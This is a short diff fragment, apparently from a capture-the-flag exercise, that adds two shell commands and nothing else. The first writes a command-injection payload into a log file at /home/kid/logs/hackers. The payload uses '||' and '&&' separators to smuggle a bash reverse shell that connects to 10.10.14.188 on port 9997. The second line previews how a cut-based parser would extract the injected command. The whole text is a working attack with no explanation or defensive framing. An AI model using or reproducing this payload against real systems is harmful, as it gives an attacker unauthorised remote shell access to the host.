@@ -1,0 +1,2 @@
+echo "  || /bin/bash -c \"bash -i >& /dev/tcp/10.10.14.188/9997 0>&1\" &&" > /home/kid/logs/hackers
+echo "  || /bin/bash -c \"bash -i >& /dev/tcp/10.10.14.188/9997 0>&1\" &&" | cut -d' ' -f3-
